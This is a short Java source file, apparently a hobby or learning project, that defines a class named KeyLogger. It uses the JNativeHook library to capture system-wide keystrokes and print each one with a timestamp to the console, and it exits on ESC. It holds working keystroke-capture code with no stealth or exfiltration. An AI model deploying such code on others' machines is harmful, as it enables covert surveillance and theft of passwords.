package com.github.giorgosg1an;

import com.github.kwhat.jnativehook.GlobalScreen;
import com.github.kwhat.jnativehook.NativeHookException;
import com.github.kwhat.jnativehook.keyboard.NativeKeyEvent;
import com.github.kwhat.jnativehook.keyboard.NativeKeyListener;

public class KeyLogger implements NativeKeyListener{
    
    @Override
    public void nativeKeyPressed(NativeKeyEvent e) {
        String timestamp = TimestampUtil.now();
        String keyText = NativeKeyEvent.getKeyText(e.getKeyCode());

        System.out.println("[" + timestamp + "] Key: " + keyText);

        // Exit on ESC Key
        if (e.getKeyCode() == NativeKeyEvent.VC_ESCAPE) {
            System.out.println("Exiting keylogger.");

            try {
                GlobalScreen.unregisterNativeHook();
            } catch (NativeHookException ex) {
                System.out.println(ex.getMessage());
            }
            System.exit(0);
        }
    }
}
